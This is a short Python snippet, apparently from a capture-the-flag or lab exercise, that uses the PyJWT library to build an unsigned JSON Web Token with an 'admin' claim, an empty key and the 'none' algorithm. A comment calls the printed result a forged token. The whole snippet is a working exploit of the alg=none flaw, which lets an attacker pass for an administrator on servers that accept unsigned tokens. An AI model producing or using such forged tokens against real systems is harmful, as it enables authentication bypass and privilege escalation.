import jwt

encoded = jwt.encode({"admin": "sybau"}, key="", algorithm="none")

print(encoded)  # Print the forged JWT token